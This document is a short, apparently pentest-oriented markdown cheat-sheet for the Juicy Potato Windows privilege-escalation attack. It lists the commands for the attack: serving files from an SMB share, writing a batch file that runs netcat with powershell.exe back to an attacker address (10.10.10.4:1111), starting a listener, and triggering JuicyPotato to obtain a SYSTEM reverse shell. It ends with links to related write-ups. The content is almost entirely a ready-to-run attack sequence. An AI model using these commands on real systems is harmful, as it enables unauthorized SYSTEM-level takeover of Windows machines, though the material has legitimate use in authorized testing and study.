# Juicy Potato: From Service Accounts to SYSTEM

1. Download [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/)
2. Start SMB server for the purpose of file sharing

        $ smbserver.py -smb2support share ./

3. Create a batch file `nc_reverse_shell.bat` that will return a SYSTEM shell on execution

        echo START \\\\10.10.10.4\\share\\nc.exe -e powershell.exe 10.10.10.4 1111 > nc_reverse_shell.bat

4. Start a listener 

        nc -nlvp 1111

5. Trigger the attack

        \\10.10.10.4\share\JuicyPotato.exe -t * -p \\10.10.10.4\share\nc_reverse_shell.bat -l 1337

## References

* https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato
* [Rotten Potato: Windows Server 2016 OS](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato